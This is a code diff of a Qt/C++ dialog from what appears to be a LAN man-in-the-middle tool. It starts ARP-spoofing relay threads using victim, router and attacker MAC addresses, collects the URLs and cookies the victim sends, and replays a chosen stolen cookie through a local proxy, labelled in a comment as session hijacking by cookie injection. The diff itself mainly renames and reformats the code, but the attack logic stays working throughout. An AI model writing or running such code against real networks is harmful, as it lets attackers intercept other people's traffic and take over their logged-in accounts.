@@ -10,24 +10,20 @@
 #include <string.h>
 
 QStringList spoof_urlList, spoof_dataList;
-pcap_t *gotoUrl;
+pcap_t *goToUrl;
 u_char *getUrlPacket;
 
-spoofUrl::spoofUrl(QWidget *parent) :
-    QDialog(parent),
-    ui(new Ui::spoofUrl)
-{
+spoofUrl::spoofUrl(QWidget *parent) : QDialog(parent), ui(new Ui::spoofUrl) {
     ui->setupUi(this);
     ui->listView->setEditTriggers(QAbstractItemView::NoEditTriggers);
 }
 
-spoofUrl::~spoofUrl()
-{
+spoofUrl::~spoofUrl() {
     delete ui;
 }
-//Session hijacking <-- cookie inject
-void spoofUrl::on_GoUrlBtn_clicked()
-{
+
+//  Session hijacking <-- cookie inject
+void spoofUrl::on_GoUrlBtn_clicked() {
     QString url = ui->listView->currentIndex().data().toString();
     QString data = spoof_dataList.at(ui->listView->currentIndex().row());
 //    QNetworkCookieJar::setCookiesFromUrl(spoof_dataList.at(ui->listView->currentIndex().row()), url);
@@ -38,38 +34,36 @@ void spoofUrl::on_GoUrlBtn_clicked()
     proxy.setPort(8080);
     manager->setProxy(proxy);
     manager->setCookieJar(new QNetworkCookieJar());
-    QNetworkRequest req(url);
-    req.setHeader(QNetworkRequest::CookieHeader, data.toStdString().c_str());
-    manager->post(req, "http://www.naver.com");
+    QNetworkRequest netRequest(url);
+    netRequest.setHeader(QNetworkRequest::CookieHeader, data.toStdString().c_str());
+    manager->post(netRequest, "http://www.naver.com");
 //    QDesktopServices::openUrl(url);
 }
 
-void spoofUrl::on_StopBtn_clicked()
-{
+void spoofUrl::on_StopBtn_clicked() {
     this->allStop();
     this->finished(1);
 }
 
-void spoofUrl::on_CancelBtn_clicked()
-{
+void spoofUrl::on_CancelBtn_clicked() {
     this->allStop();
     this->finished(1);
     this->close();
 }
 
-void spoofUrl::spoof_getAll(QString getIP, QString getRouterIP, QString getLen, QString getRouterMac, QString getMyMac, QString getVictimMac, u_char *pkt, pcap_t *dump_p) {
-    gotoUrl = dump_p;
-    getUrlPacket = pkt;
-    rep = new relay_falsify(this);
-    rep->rep_getAll(getIP, getRouterIP, getLen, getVictimMac, getMyMac, getRouterMac, pkt, dump_p);
-    rep->start();
-    get = new relay_spoof(this);
-    get->mac_get(getVictimMac, getMyMac, getRouterMac);
-    get->start();
+void spoofUrl::spoofGetInfo(QString relayGetVictimIP, QString relayGetVictimMac, QString relayGetRouterIP, QString relayGetRouterMac, QString relayGetAtkMac, QString relayGetLen, u_char *relayPacket, pcap_t *relayPcap, pcap_if_t *relayDevs) {
+    goToUrl = relayPcap;
+    getUrlPacket = relayPacket;
+    relayFalsify = new relay_falsify(this);
+    relayFalsify->relayGetInfo(relayGetVictimIP, relayGetVictimMac, relayGetRouterIP, relayGetRouterMac, relayGetAtkMac, relayGetLen, relayPacket, relayPcap);
+    relayFalsify->start();
+    relaySpoof = new relay_spoof(this);
+    relaySpoof->relayGetMacInfo(relayGetVictimMac, relayGetAtkMac, relayGetRouterMac, relayDevs);
+    relaySpoof->start();
     spoof_md = new QStringListModel();
-    connect(get, SIGNAL(urlList(QStringList)), this, SLOT(spoof_getUrl(QStringList)));
-    connect(get, SIGNAL(data_list(QStringList)), this, SLOT(spoof_postUrl(QStringList)));
-    connect(get, SIGNAL(spoof_fin(bool)), this, SLOT(spoof_get_fin(bool)));
+    connect(relaySpoof, SIGNAL(relay_urlList(QStringList)), this, SLOT(spoof_getUrl(QStringList)));
+    connect(relaySpoof, SIGNAL(relay_dataList(QStringList)), this, SLOT(spoof_postUrl(QStringList)));
+    connect(relaySpoof, SIGNAL(relay_spoofFin(bool)), this, SLOT(spoof_getFin(bool)));
 }
 
 void spoofUrl::spoof_getUrl(QStringList url_list) {
@@ -80,14 +74,14 @@ void spoofUrl::spoof_getUrl(QStringList url_list) {
 
 void spoofUrl::spoof_postUrl(QStringList data_list) {
     spoof_dataList = data_list;
-    //pcap_sendpacket(gotoUrl, getUrlPacket, sizeof(getUrlPacket));
+    //pcap_sendpacket(goToUrl, getUrlPacket, sizeof(getUrlPacket));
 }
 
-void spoofUrl::spoof_get_fin(bool) {
+void spoofUrl::spoof_getFin(bool) {
     QMessageBox::information(this, "Spoof Finish", "Spoofing is finished!!");
 }
 
 void spoofUrl::allStop() {
-    rep->stop = false;
-    get->get_stop = true;
+    relayFalsify->falsifyStop = false;
+    relaySpoof->spoofStop = true;
 }
